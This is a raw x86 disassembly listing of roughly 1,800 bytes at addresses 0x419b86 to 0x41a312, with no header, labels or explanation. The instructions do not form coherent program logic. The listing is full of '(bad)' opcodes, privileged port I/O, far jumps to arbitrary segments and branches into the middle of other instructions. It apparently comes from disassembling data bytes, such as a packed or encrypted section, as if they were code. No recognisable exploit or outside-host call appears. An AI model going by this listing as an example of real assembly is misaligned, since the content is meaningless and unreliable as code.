  419b86:	mov    esp,0x9a5b92c7
  419b8b:	in     eax,dx
  419b8c:	push   eax
  419b8d:	add    dh,BYTE PTR [ecx+0x5d]
  419b90:	mov    eax,0xc7167974
  419b95:	sub    eax,0x8ff4b18b
  419b9a:	ret    0x50e7
  419b9d:	push   cs
  419b9e:	jle    0x419c0e
  419ba0:	(bad)  [esi]
  419ba2:	dec    edx
  419ba3:	fcomip st,st(4)
  419ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba6:	sbb    BYTE PTR [edi+0x538f26e4],cl
  419bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bad:	adc    al,0x89
  419baf:	cwde   
  419bb0:	sub    DWORD PTR [ebp+0x73],0xaf5d62cc
  419bb7:	cmp    DWORD PTR [edi],esi
  419bb9:	sbb    BYTE PTR [esi+0x8],dh
  419bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbd:	push   ss
  419bbe:	or     eax,0x25da99ef
  419bc3:	mov    ds:0x286e8243,al
  419bc8:	mov    al,0xf2
  419bca:	pop    edx
  419bcb:	test   al,0xbc
  419bcd:	or     eax,0x95c5fe22
  419bd2:	scas   eax,DWORD PTR es:[edi]
  419bd3:	pop    ds
  419bd4:	ins    BYTE PTR es:[edi],dx
  419bd5:	push   esp
  419bd6:	into   
  419bd7:	rcr    BYTE PTR [ebx-0x26],1
  419bda:	mov    BYTE PTR [edi+0x47],bh
  419bdd:	stc    
  419bde:	or     ah,ch
  419be0:	xchg   ecx,eax
  419be1:	inc    esi
  419be2:	cdq    
  419be3:	xchg   edi,eax
  419be4:	js     0x419c60
  419be6:	jg     0x419c2d
  419be8:	test   DWORD PTR [ebp-0xf],esp
  419beb:	retf   0x4f3f
  419bee:	mov    WORD PTR ds:0x9313ebdf,cs
  419bf4:	pop    edi
  419bf5:	dec    esi
  419bf6:	cmp    eax,0x46dd2c8a
  419bfb:	call   0xeba06fd7
  419c00:	retf   
  419c01:	retf   0x55d0
  419c04:	lahf   
  419c05:	mov    eax,ds:0x60666005
  419c0a:	stc    
  419c0b:	adc    dh,BYTE PTR [ecx+ebp*1+0x2]
  419c0f:	lods   eax,DWORD PTR ds:[esi]
  419c10:	push   cs
  419c11:	sub    BYTE PTR [esi+0x68],bh
  419c14:	and    ebp,DWORD PTR es:[edi]
  419c17:	or     ecx,esp
  419c19:	adc    eax,0xdb376f26
  419c1e:	shl    BYTE PTR [eax],1
  419c20:	sbb    DWORD PTR [ebp-0xa],0xffffffd0
  419c24:	jmp    0x419be7
  419c26:	xor    eax,0xafa9d800
  419c2b:	inc    ebx
  419c2c:	cmp    cl,BYTE PTR [esp+esi*1+0x3422b876]
  419c33:	(bad)  
  419c35:	inc    ecx
  419c36:	fwait
  419c37:	pop    esp
  419c38:	(bad)  
  419c39:	cwde   
  419c3a:	mov    DWORD PTR [ebx*8-0x2444d7c],0x9bcb574f
  419c45:	push   edx
  419c46:	sti    
  419c47:	stos   DWORD PTR es:[edi],eax
  419c48:	sbb    dl,ch
  419c4a:	push   edi
  419c4b:	aas    
  419c4c:	xor    DWORD PTR [edi-0x17],0xffffff93
  419c50:	add    BYTE PTR [ebx-0x63],dl
  419c53:	lods   al,BYTE PTR ds:[esi]
  419c54:	loop   0x419c43
  419c56:	lahf   
  419c57:	adc    ebx,esi
  419c59:	test   BYTE PTR [ebx+0x5bfab876],bh
  419c5f:	add    al,BYTE PTR [ebp-0x7c]
  419c62:	test   al,0xf5
  419c64:	add    ebx,DWORD PTR [edi]
  419c66:	fdivr  st(3),st
  419c68:	pop    es
  419c69:	pop    ds
  419c6a:	add    ch,BYTE PTR [edi-0x5e457ba5]
  419c70:	jno    0x419c23
  419c72:	mov    cl,0x1e
  419c74:	inc    bh
  419c76:	fsubrp st(1),st
  419c78:	inc    edx
  419c79:	xor    eax,0x4b98f442
  419c7e:	js     0x419c58
  419c80:	sub    cl,dl
  419c82:	or     eax,0xed8710d9
  419c87:	cld    
  419c88:	and    al,0x15
  419c8a:	mov    esp,ebx
  419c8c:	pop    ds
  419c8d:	adc    eax,0xe943ba57
  419c92:	test   eax,0x413f2823
  419c97:	jg     0x419cd3
  419c99:	fwait
  419c9a:	pop    ds
  419c9b:	xchg   esi,eax
  419c9c:	pop    esp
  419c9d:	jp     0x419cbb
  419c9f:	aaa    
  419ca0:	cmp    al,0xd3
  419ca2:	in     al,dx
  419ca3:	jae    0x419c61
  419ca5:	shl    BYTE PTR [ebx-0x27ff4c78],cl
  419cab:	mov    eax,ds:0xa3783e91
  419cb0:	add    eax,0x3365d7d7
  419cb5:	fiadd  WORD PTR [esi-0x34f70c06]
  419cbb:	pop    ecx
  419cbc:	and    bh,BYTE PTR fs:[ebx-0x58]
  419cc0:	mov    bl,0x4
  419cc2:	fst    QWORD PTR [edi+0x2b594d63]
  419cc8:	and    al,0xe9
  419cca:	inc    esp
  419ccb:	add    bl,BYTE PTR [eax]
  419ccd:	aaa    
  419cce:	dec    edx
  419ccf:	or     esp,eax
  419cd1:	lock dec ebx
  419cd3:	test   WORD PTR [ebx],bx
  419cd6:	lock push ebp
  419cd8:	adc    edi,DWORD PTR [eax]
  419cda:	inc    esp
  419cdb:	std    
  419cdc:	inc    ecx
  419cdd:	push   esp
  419cde:	sti    
  419cdf:	fsub   QWORD PTR [eax+0x3f]
  419ce2:	xlat   BYTE PTR ds:[ebx]
  419ce3:	jl     0x419caf
  419ce5:	jo     0x419c8f
  419ce7:	jnp    0x419d13
  419ce9:	or     DWORD PTR [ecx-0x1c],eax
  419cec:	cmp    edx,esp
  419cee:	das    
  419cef:	dec    esi
  419cf0:	lods   al,BYTE PTR ds:[esi]
  419cf1:	adc    eax,0x695c5197
  419cf6:	add    al,0xe8
  419cf8:	popa   
  419cf9:	mov    ebp,0x569f6054
  419cfe:	and    BYTE PTR [eax+0x57],dl
  419d01:	inc    ebp
  419d02:	cmc    
  419d03:	aad    0xec
  419d05:	jo     0x419d3f
  419d07:	pop    ecx
  419d08:	cmp    BYTE PTR ss:0xe6a2a054,0xef
  419d10:	test   BYTE PTR [ecx-0x485f481b],dl
  419d16:	pop    edx
  419d17:	imul   edx,DWORD PTR [esi-0xa],0x57
  419d1b:	stos   DWORD PTR es:[edi],eax
  419d1c:	(bad)  
  419d1d:	rcl    BYTE PTR [ebx],1
  419d1f:	loopne 0x419d91
  419d21:	sbb    BYTE PTR [ebp-0x6e],ah
  419d24:	jno    0x419d54
  419d26:	push   edx
  419d27:	or     DWORD PTR [edi-0x58],ebx
  419d2a:	dec    ebp
  419d2b:	test   eax,0xdc9dc73a
  419d30:	xchg   edi,eax
  419d31:	shl    DWORD PTR [edx],1
  419d33:	sahf   
  419d34:	jne    0x419ccc
  419d36:	inc    esi
  419d37:	mov    ds:0xc327b767,al
  419d3c:	repz add eax,0xfa526bba
  419d42:	mov    edx,0x2f3b19e3
  419d47:	aad    0xf1
  419d49:	add    DWORD PTR [eax],edx
  419d4b:	jae    0x419d76
  419d4d:	mov    dl,0xc6
  419d4f:	jne    0x419db3
  419d51:	xchg   ebx,ecx
  419d53:	dec    esp
  419d54:	scas   eax,DWORD PTR es:[edi]
  419d55:	pop    ecx
  419d56:	push   edi
  419d57:	sub    al,0x6
  419d59:	rcr    BYTE PTR [edi+eiz*8-0x73],0x5e
  419d5e:	cmp    ah,bl
  419d60:	adc    eax,0xf26034dd
  419d65:	or     eax,0x7c659e80
  419d6a:	ins    BYTE PTR es:[edi],dx
  419d6b:	ds push 0xc83dfd75
  419d71:	xchg   BYTE PTR [ebp-0x33],dl
  419d74:	jmp    0x419d06
  419d76:	inc    esi
  419d77:	test   eax,0xac84817f
  419d7c:	jne    0x419d65
  419d7e:	aas    
  419d7f:	xchg   edi,eax
  419d80:	xor    al,0x95
  419d82:	int3   
  419d83:	(bad)  
  419d84:	retf   
  419d85:	rep outs dx,BYTE PTR ds:[esi]
  419d87:	xchg   BYTE PTR [edi-0x35377ee0],al
  419d8d:	mov    ah,0x9c
  419d8f:	jbe    0x419de9
  419d91:	aas    
  419d92:	out    dx,al
  419d93:	cmc    
  419d94:	in     al,0x6b
  419d96:	and    DWORD PTR [ebp+0x545c1813],0xf4146b54
  419da0:	or     dl,BYTE PTR [eax+0x2f50a19a]
  419da6:	imul   esi,DWORD PTR [ebx+0x45e10efe],0xd
  419dad:	pop    esi
  419dae:	jns    0x419ddb
  419db0:	lds    ebp,FWORD PTR [ebx+0x5543abd3]
  419db6:	pop    eax
  419db7:	cwde   
  419db8:	rcr    BYTE PTR [eax+0x26a478d4],0xbe
  419dbf:	mov    ecx,0xb5f9df9
  419dc4:	mov    ebx,ds
  419dc6:	aad    0xb5
  419dc8:	aas    
  419dc9:	cmp    dh,BYTE PTR [ecx+0x67]
  419dcc:	xchg   esp,eax
  419dcd:	loop   0x419e21
  419dcf:	mov    ds:0x324d255b,al
  419dd4:	xor    esi,edi
  419dd6:	clc    
  419dd7:	jmp    0x72fa1a05
  419ddc:	pop    es
  419ddd:	js     0x419e2a
  419ddf:	sbb    DWORD PTR [edx+0x4f536ede],ebx
  419de5:	lea    ecx,[edx+0x7c]
  419de8:	retf   
  419de9:	mov    BYTE PTR [ecx],dl
  419deb:	push   cs
  419dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ded:	dec    ebp
  419dee:	lds    edi,FWORD PTR [eax]
  419df0:	dec    edi
  419df1:	sub    DWORD PTR [ebp-0x21f0a640],eax
  419df7:	push   edx
  419df8:	push   ss
  419df9:	mov    al,0xf7
  419dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dfc:	and    dh,ah
  419dfe:	dec    esi
  419dff:	and    ecx,edx
  419e01:	mov    ah,0x4d
  419e03:	mov    ah,0xa0
  419e05:	fadd   QWORD PTR [esi+esi*4]
  419e08:	pushf  
  419e09:	cmc    
  419e0a:	jmp    0xe94ff16b
  419e0f:	cs mov cl,0x72
  419e12:	fnsave [ebp-0x1d4f1f00]
  419e18:	mov    eax,0x76dc92f5
  419e1d:	(bad)  
  419e1e:	fdivr  DWORD PTR [ebx]
  419e20:	dec    esi
  419e21:	mov    edx,0x9117fa29
  419e26:	in     al,dx
  419e27:	lahf   
  419e28:	data16 sbb BYTE PTR [ecx],bl
  419e2b:	adc    dl,BYTE PTR [ebx+0x6e]
  419e2e:	rcl    DWORD PTR [edi+0x26d3b70b],0x5b
  419e35:	inc    edi
  419e36:	int    0x14
  419e38:	sbb    DWORD PTR [ecx+0x4d],eax
  419e3b:	inc    edx
  419e3c:	in     al,dx
  419e3d:	jge    0x419e4b
  419e3f:	int3   
  419e40:	inc    eax
  419e41:	or     BYTE PTR [esi-0x59fd0977],bh
  419e47:	(bad)  
  419e48:	ficom  WORD PTR [ebp+0x65323e4b]
  419e4e:	(bad)  
  419e4f:	daa    
  419e50:	jmp    0x8d65:0x38fde9ef
  419e57:	mov    cl,BYTE PTR [ebx-0x7d]
  419e5a:	pop    edx
  419e5b:	xchg   ebx,eax
  419e5c:	(bad)  
  419e5d:	push   ds
  419e5e:	scas   al,BYTE PTR es:[edi]
  419e5f:	test   edi,0x8eeb2fb0
  419e65:	inc    eax
  419e66:	std    
  419e67:	inc    edx
  419e68:	mov    dh,0xf3
  419e6a:	jl     0x419e9b
  419e6c:	cld    
  419e6d:	test   DWORD PTR [ecx+0x5b],edx
  419e70:	mov    cl,0x45
  419e72:	pop    ss
  419e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e74:	sahf   
  419e75:	pusha  
  419e76:	loop   0x419e80
  419e78:	and    eax,0x3fcfbaf4
  419e7d:	imul   esi,DWORD PTR [ebp+0x5e],0x7f
  419e81:	and    DWORD PTR [ecx+0x5b],ecx
  419e84:	mov    al,0xab
  419e86:	jl     0x419ecb
  419e88:	mov    ah,0xe1
  419e8a:	cmc    
  419e8b:	adc    al,BYTE PTR [ecx-0x54]
  419e8e:	lods   eax,DWORD PTR ds:[esi]
  419e8f:	(bad)  
  419e91:	rcl    DWORD PTR [edx],1
  419e93:	cmp    eax,0x8dcba5d3
  419e98:	adc    ch,BYTE PTR [eax]
  419e9a:	dec    edx
  419e9b:	mov    ecx,0x5340d843
  419ea0:	xor    ah,BYTE PTR [edi-0x560600cb]
  419ea6:	imul   edi,edi,0xffffff83
  419ea9:	iret   
  419eaa:	or     dl,BYTE PTR [ebp-0x39]
  419ead:	xor    eax,0xdc4ab687
  419eb2:	jmp    0x419e65
  419eb4:	mov    ecx,0x16937c0f
  419eb9:	mov    ch,0x9e
  419ebb:	sub    al,0x5e
  419ebd:	sar    DWORD PTR [eax-0x51],cl
  419ec0:	push   esp
  419ec1:	adc    ah,bh
  419ec3:	adc    ebp,DWORD PTR [edx]
  419ec5:	or     eax,0xe8e0eff2
  419eca:	mov    bh,bh
  419ecc:	pop    es
  419ecd:	sub    BYTE PTR [eax+0x26],0xaa
  419ed1:	enter  0x95af,0x26
  419ed5:	in     eax,0x58
  419ed7:	mov    ds:0x33696b25,al
  419edc:	mov    eax,0x6ad8da42
  419ee1:	xchg   ebp,eax
  419ee2:	ins    BYTE PTR es:[edi],dx
  419ee3:	ja     0x419f35
  419ee5:	mov    al,ds:0x221ed6e4
  419eea:	cmp    al,bh
  419eec:	inc    edx
  419eed:	inc    ecx
  419eee:	pop    ds
  419eef:	add    bl,BYTE PTR [esi]
  419ef1:	lahf   
  419ef2:	mov    bl,0xc2
  419ef4:	mov    al,0x32
  419ef6:	not    DWORD PTR [eax-0x76]
  419ef9:	pop    edi
  419efa:	lock daa 
  419efc:	or     DWORD PTR [ecx],ebx
  419efe:	dec    esi
  419eff:	jle    0x419efc
  419f01:	lahf   
  419f02:	in     eax,0x40
  419f04:	sub    eax,0x696c684d
  419f09:	push   cs
  419f0a:	add    DWORD PTR [edi+ebp*2],0xadb6b81d
  419f11:	sbb    DWORD PTR [ecx+eax*2+0x2f7bee34],ecx
  419f18:	sti    
  419f19:	jge    0x419f70
  419f1b:	aas    
  419f1c:	inc    ecx
  419f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f1e:	adc    ebp,DWORD PTR [esi+eax*4-0x6a93685f]
  419f25:	push   edi
  419f26:	dec    edx
  419f27:	inc    ebp
  419f28:	adc    DWORD PTR [ebp+ebx*1-0x13],edi
  419f2c:	inc    edx
  419f2d:	mov    ebx,0x4d2947a
  419f32:	not    BYTE PTR [ecx]
  419f34:	mov    ah,0xff
  419f36:	mov    ecx,0xa7a2d2c4
  419f3b:	pop    ss
  419f3c:	cld    
  419f3d:	inc    ecx
  419f3e:	inc    eax
  419f3f:	mov    ebx,0x8d813000
  419f44:	jg     0x419f1f
  419f46:	les    edi,FWORD PTR [esi+esi*1-0x577e73a8]
  419f4d:	inc    ecx
  419f4e:	gs jne 0x419f8f
  419f51:	aaa    
  419f52:	or     DWORD PTR [edx],edi
  419f54:	sahf   
  419f55:	pop    ebp
  419f56:	push   ebp
  419f57:	adc    ah,dl
  419f59:	outs   dx,BYTE PTR ds:[esi]
  419f5a:	mov    ds:0x12c2a9,al
  419f5f:	xchg   ecx,eax
  419f60:	lock mov eax,0x3b690756
  419f66:	test   DWORD PTR fs:[esi],edi
  419f69:	(bad)  
  419f6a:	lods   eax,DWORD PTR ds:[esi]
  419f6b:	xor    eax,0xbf88870e
  419f70:	pusha  
  419f71:	mov    al,ds:0xf809b41a
  419f76:	sbb    eax,0x20e5363
  419f7b:	inc    esi
  419f7c:	adc    al,0x3c
  419f7e:	aam    0x36
  419f80:	in     al,dx
  419f81:	xchg   ebp,eax
  419f82:	imul   esp,DWORD PTR [ecx+0x48],0x15e1836
  419f89:	pop    ss
  419f8a:	aaa    
  419f8b:	sbb    DWORD PTR [ebx],0x4cc6670
  419f91:	xor    BYTE PTR [eax-0x7],bl
  419f94:	dec    edi
  419f95:	jne    0x419ff7
  419f97:	add    DWORD PTR [edi+ebx*4+0x4aeee9d0],ebx
  419f9e:	cmovnp eax,DWORD PTR [eax]
  419fa1:	ja     0x419f55
  419fa3:	cmc    
  419fa4:	xchg   ebp,eax
  419fa5:	xchg   esi,eax
  419fa6:	mov    ch,0xf4
  419fa8:	pop    es
  419fa9:	mov    ah,0x8f
  419fab:	cmp    DWORD PTR gs:[ebp-0x30],esp
  419faf:	push   eax
  419fb0:	out    dx,eax
  419fb1:	xchg   edi,eax
  419fb2:	xlat   BYTE PTR ds:[ebx]
  419fb3:	pop    edi
  419fb4:	mov    cl,0xf9
  419fb6:	sub    ch,BYTE PTR [ecx-0x51]
  419fb9:	xchg   ebp,eax
  419fba:	push   edx
  419fbb:	into   
  419fbc:	jmp    0x77899a2f
  419fc1:	mul    DWORD PTR [ebx-0x6491e40d]
  419fc7:	mov    ds,WORD PTR [edi-0x7adef3f5]
  419fcd:	sub    eax,0x6970212e
  419fd2:	ret    
  419fd3:	pop    ds
  419fd4:	rcl    BYTE PTR [esi-0x74],0x31
  419fd8:	add    DWORD PTR [ebx+0x213f78e0],eax
  419fde:	in     al,0xb5
  419fe0:	pop    edx
  419fe1:	mov    dh,0x21
  419fe3:	push   0xb673ef3b
  419fe8:	das    
  419fe9:	cli    
  419fea:	jl     0x41a04c
  419fec:	sbb    ebx,edx
  419fee:	ret    
  419fef:	mov    esi,0x24848b47
  419ff4:	test   eax,0x5951b838
  419ff9:	inc    edx
  419ffa:	mov    ebx,eax
  419ffc:	(bad)  
  419ffd:	retf   0x9626
  41a000:	or     BYTE PTR [eax+eiz*2],dl
  41a003:	mov    ch,0xb0
  41a005:	inc    ebx
  41a006:	sub    DWORD PTR [eax+0x5aac6135],esi
  41a00c:	jno    0x41a00b
  41a00e:	sti    
  41a00f:	sub    dh,BYTE PTR [ebx+eax*1+0x4867c3c0]
  41a016:	loope  0x41a037
  41a018:	sbb    bl,al
  41a01a:	mov    ds:0x1a61524a,al
  41a01f:	mov    ds:0x5804002e,eax
  41a024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a025:	push   edx
  41a026:	add    DWORD PTR [ebx+0x3187965e],edx
  41a02c:	or     edx,DWORD PTR [esi+0x7fa61305]
  41a032:	(bad)  
  41a033:	call   0x9bd0:0xe982512
  41a03a:	cmp    ebx,edx
  41a03c:	stc    
  41a03d:	ret    0xf693
  41a040:	cmc    
  41a041:	and    dl,bl
  41a043:	sbb    cl,cl
  41a045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a046:	in     eax,dx
  41a047:	or     al,0xf8
  41a049:	mov    ch,0xed
  41a04b:	mov    ch,0xf6
  41a04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a04e:	call   0x5c0:0xbbd030dd
  41a055:	jge    0x41a0c6
  41a057:	xor    eax,DWORD PTR [edi]
  41a059:	adc    ah,BYTE PTR [ebx]
  41a05b:	cwde   
  41a05c:	outs   dx,BYTE PTR ds:[esi]
  41a05d:	mov    ds:0xbcf9ffd1,al
  41a062:	dec    edi
  41a063:	cmp    al,0xf9
  41a065:	sub    al,0x6c
  41a067:	mov    dh,0x1b
  41a069:	sti    
  41a06a:	inc    ebp
  41a06b:	mov    ebp,0x53ecc8fc
  41a070:	lea    esi,[ebx-0x5b]
  41a073:	retf   
  41a074:	jnp    0x41a0d1
  41a076:	adc    eax,0xc74b598e
  41a07b:	jle    0x41a090
  41a07d:	stos   DWORD PTR es:[edi],eax
  41a07e:	or     DWORD PTR ds:0xf179e83d,edi
  41a084:	push   edi
  41a085:	mov    edx,0x8b521bcf
  41a08a:	daa    
  41a08b:	lock hlt 
  41a08d:	sbb    DWORD PTR [ecx-0x73],0x31
  41a091:	out    0xe0,eax
  41a093:	lods   al,BYTE PTR ds:[esi]
  41a094:	adc    ecx,DWORD PTR [esi]
  41a096:	dec    esp
  41a097:	xor    ebx,DWORD PTR [eax+0x7b56a30d]
  41a09d:	iret   
  41a09e:	mov    ecx,DWORD PTR [eax]
  41a0a0:	mov    edi,DWORD PTR ds:0x472b45e2
  41a0a6:	sbb    BYTE PTR [ecx+eax*4],dh
  41a0a9:	jo     0x41a0e3
  41a0ab:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a0ad:	mov    edx,0x2224a22c
  41a0b2:	mov    esp,0x1c01bd33
  41a0b7:	mov    bl,0x9e
  41a0b9:	shl    DWORD PTR [edi-0x2d],cl
  41a0bc:	xor    DWORD PTR [ebp-0x4d36267d],0x9
  41a0c3:	and    esi,DWORD PTR [esi+0x26832a67]
  41a0c9:	gs repnz in al,dx
  41a0cc:	push   0x9115506d
  41a0d1:	in     al,0x44
  41a0d3:	std    
  41a0d4:	sar    DWORD PTR [ebp-0x5e],cl
  41a0d7:	or     DWORD PTR [esi],0x9c99956
  41a0dd:	mov    ebx,0x65e3243c
  41a0e2:	or     al,0x5c
  41a0e4:	adc    ecx,0xffffffa1
  41a0e7:	cli    
  41a0e8:	adc    eax,0xa247a422
  41a0ed:	mov    bl,0xa3
  41a0ef:	mov    ebp,ebx
  41a0f1:	js     0x41a158
  41a0f3:	std    
  41a0f4:	jnp    0x41a175
  41a0f6:	out    0xd8,eax
  41a0f8:	ss and eax,0xdec239ed
  41a0fe:	fist   DWORD PTR [ecx-0x49c71133]
  41a104:	cld    
  41a105:	adc    DWORD PTR [esi-0x7b5fcebc],edi
  41a10b:	jo     0x41a14d
  41a10d:	jmp    0x41a158
  41a10f:	sub    dl,BYTE PTR [esi-0x45]
  41a112:	or     eax,0x5582109d
  41a117:	std    
  41a118:	xchg   ebp,eax
  41a119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a11a:	out    0x56,eax
  41a11c:	xor    al,0xa8
  41a11e:	clc    
  41a11f:	out    0x89,eax
  41a121:	cli    
  41a122:	push   ebx
  41a123:	imul   edi,DWORD PTR [eax],0x2e4ddd93
  41a129:	shr    cl,1
  41a12b:	test   al,0x4d
  41a12d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a12e:	not    DWORD PTR [ebp+eiz*8-0x22]
  41a132:	stos   DWORD PTR es:[edi],eax
  41a133:	neg    DWORD PTR fs:[edx+0x6d]
  41a137:	xchg   esp,eax
  41a138:	rcl    esi,1
  41a13a:	jno    0x41a11d
  41a13c:	shr    ebp,cl
  41a13e:	test   BYTE PTR [ebx-0x1dbf1f8b],bh
  41a144:	and    eax,0xc7b2fa21
  41a149:	cmp    BYTE PTR [esi-0x54f41fad],dl
  41a14f:	gs popf 
  41a151:	push   ds
  41a152:	xchg   edi,eax
  41a153:	scas   al,BYTE PTR es:[edi]
  41a154:	pop    ecx
  41a155:	loope  0x41a10b
  41a157:	ret    0xd019
  41a15a:	inc    edx
  41a15b:	and    BYTE PTR [ebx-0x7d06db5a],dl
  41a161:	push   eax
  41a162:	push   0x31
  41a164:	addr16 in al,dx
  41a166:	pushf  
  41a167:	dec    ebx
  41a168:	mov    dl,0x63
  41a16a:	in     eax,0xc9
  41a16c:	add    BYTE PTR [ebx],ah
  41a16e:	xor    edi,eax
  41a170:	leave  
  41a171:	dec    esi
  41a172:	jle    0x41a1b7
  41a174:	inc    edx
  41a175:	jl     0x41a1a5
  41a177:	xlat   BYTE PTR ds:[ebx]
  41a178:	stos   BYTE PTR es:[edi],al
  41a179:	retf   
  41a17a:	fld    QWORD PTR [edx-0x540d1f1a]
  41a180:	aas    
  41a181:	aaa    
  41a182:	repz pushf 
  41a184:	xor    BYTE PTR [ebp-0x16],bl
  41a187:	dec    eax
  41a188:	sbb    DWORD PTR [ebp+0x1e],ebx
  41a18b:	imul   edi,DWORD PTR [ebx-0x74606ce1],0x70d6b23a
  41a195:	(bad)  
  41a196:	sub    BYTE PTR [eax],0xb5
  41a199:	push   es
  41a19a:	pushf  
  41a19b:	pop    DWORD PTR [edi+0x2034504]
  41a1a1:	sub    BYTE PTR [edx+0x7a],dl
  41a1a4:	hlt    
  41a1a5:	inc    esi
  41a1a6:	push   edi
  41a1a7:	enter  0x4c11,0xa7
  41a1ab:	add    ch,BYTE PTR [edi+0x1782c88b]
  41a1b1:	outs   dx,BYTE PTR ds:[esi]
  41a1b2:	sbb    BYTE PTR [esi+0x566e803],ch
  41a1b8:	xchg   ecx,eax
  41a1b9:	jge    0x41a203
  41a1bb:	repnz lods al,BYTE PTR ds:[esi]
  41a1bd:	dec    edx
  41a1be:	and    al,0x5f
  41a1c0:	sbb    BYTE PTR [ebx+ebx*2-0x77],cl
  41a1c4:	pop    ds
  41a1c5:	adc    eax,0x64d9dfb8
  41a1ca:	pop    edx
  41a1cb:	push   cs
  41a1cc:	pop    es
  41a1cd:	stc    
  41a1ce:	into   
  41a1cf:	fld    DWORD PTR [ebx+0x2f395c9d]
  41a1d5:	aas    
  41a1d6:	inc    edx
  41a1d7:	jle    0x41a1b7
  41a1d9:	pop    edi
  41a1da:	fdiv   st(3),st
  41a1dc:	fs inc esp
  41a1de:	sub    BYTE PTR [ebx+eiz*1+0x4e46f366],ah
  41a1e5:	fistp  DWORD PTR [ebx]
  41a1e7:	inc    esi
  41a1e8:	outs   dx,DWORD PTR ds:[esi]
  41a1e9:	adc    esp,DWORD PTR [ebx+0x4eb89f83]
  41a1ef:	rcr    BYTE PTR [edi+0xd],cl
  41a1f2:	and    ecx,esp
  41a1f4:	repnz inc edx
  41a1f6:	dec    esi
  41a1f7:	inc    ebx
  41a1f8:	sbb    bl,al
  41a1fa:	cli    
  41a1fb:	arpl   WORD PTR [ebp-0x50],bp
  41a1fe:	mov    esi,DWORD PTR [ebp+edx*8+0x3]
  41a202:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41a204:	aad    0xc7
  41a206:	push   ebp
  41a207:	mov    eax,ds:0x15db51ad
  41a20c:	out    dx,eax
  41a20d:	fs mov ebx,0x196a4547
  41a213:	jne    0x41a25b
  41a215:	ret    0x34ce
  41a218:	adc    BYTE PTR [edx+ebp*8-0x9],0x1a
  41a21d:	call   0x66826bcb
  41a222:	fld    DWORD PTR [esi-0x75f808cd]
  41a228:	pop    eax
  41a229:	les    ebp,FWORD PTR [edx-0x57a64f60]
  41a22f:	pop    eax
  41a230:	and    al,0x75
  41a232:	shl    DWORD PTR [ebp+0x7c],cl
  41a235:	mov    dh,0x50
  41a237:	mov    bl,0xf0
  41a239:	mov    esi,0xeab227c1
  41a23e:	jns    0x41a2a1
  41a240:	daa    
  41a241:	std    
  41a242:	jp     0x41a29d
  41a244:	dec    ebx
  41a245:	jecxz  0x41a1ca
  41a247:	jne    0x41a1fa
  41a249:	std    
  41a24a:	idiv   DWORD PTR [edx+0x28]
  41a24d:	sti    
  41a24e:	loope  0x41a24f
  41a250:	push   eax
  41a251:	out    dx,al
  41a252:	out    dx,eax
  41a253:	call   0xb095:0xd7efa821
  41a25a:	cld    
  41a25b:	inc    eax
  41a25c:	(bad)  
  41a25d:	or     al,0x50
  41a25f:	cli    
  41a260:	inc    ecx
  41a261:	pop    ebp
  41a262:	ss stos DWORD PTR es:[edi],eax
  41a264:	int    0x70
  41a266:	scas   al,BYTE PTR es:[edi]
  41a267:	jecxz  0x41a2c2
  41a269:	test   eax,0x2e4bd688
  41a26e:	in     al,dx
  41a26f:	arpl   WORD PTR [edi],dx
  41a271:	jne    0x41a2cb
  41a273:	push   ds
  41a274:	mov    cl,0x13
  41a276:	mov    ecx,0x8799c4b1
  41a27b:	jecxz  0x41a2f9
  41a27d:	add    eax,0x400ac067
  41a282:	stc    
  41a283:	xchg   ebx,eax
  41a284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a285:	jle    0x41a26b
  41a287:	clc    
  41a288:	jb     0x41a2ef
  41a28a:	inc    edi
  41a28b:	fild   DWORD PTR es:[ebp-0x4b]
  41a28f:	jb     0x41a2ba
  41a291:	js     0x41a24c
  41a293:	lea    eax,[edi+0x69]
  41a296:	pop    es
  41a297:	jecxz  0x41a276
  41a299:	fstp   TBYTE PTR [esi+0x48]
  41a29c:	cmp    BYTE PTR ds:0xafeaf041,0x2
  41a2a3:	xor    eax,0x862c8e80
  41a2a8:	xchg   edi,eax
  41a2a9:	imul   edx,DWORD PTR [esi+0x51],0xed25d31b
  41a2b0:	pop    ds
  41a2b1:	cdq    
  41a2b2:	imul   ebp,DWORD PTR [ebx+0x4c5614a0],0xffffffb6
  41a2b9:	pop    es
  41a2ba:	and    bh,BYTE PTR [edi+0x678839e2]
  41a2c0:	mov    eax,0xb1dd25c9
  41a2c5:	popa   
  41a2c6:	push   0xf
  41a2c8:	ret    0x767e
  41a2cb:	out    dx,al
  41a2cc:	cmp    BYTE PTR [ebp-0x47069815],ch
  41a2d2:	das    
  41a2d3:	scas   eax,DWORD PTR es:[edi]
  41a2d4:	out    0x59,eax
  41a2d6:	dec    ecx
  41a2d7:	(bad)  ds:0xed768bea
  41a2dd:	mov    bl,0xe2
  41a2df:	leave  
  41a2e0:	push   ecx
  41a2e1:	mov    ah,0x82
  41a2e3:	jbe    0x41a2a5
  41a2e5:	ds lahf 
  41a2e7:	call   0x6933f53d
  41a2ec:	inc    ebp
  41a2ed:	aaa    
  41a2ee:	pop    esi
  41a2ef:	(bad)  
  41a2f1:	xchg   DWORD PTR [eax+0x10ec5ccd],eax
  41a2f7:	scas   eax,DWORD PTR es:[edi]
  41a2f8:	dec    esp
  41a2f9:	pop    ds
  41a2fa:	jbe    0x41a2a2
  41a2fc:	test   eax,0x49045a78
  41a301:	in     eax,0x65
  41a303:	loop   0x41a383
  41a305:	fs (bad) 
  41a307:	fistp  WORD PTR [edx]
  41a309:	retf   
  41a30a:	dec    ebx
  41a30b:	loop   0x41a351
  41a30d:	cdq    
  41a30e:	es jle 0x41a305
  41a311:	xchg   ebp,eax
  41a312:	push   0xffffff8d
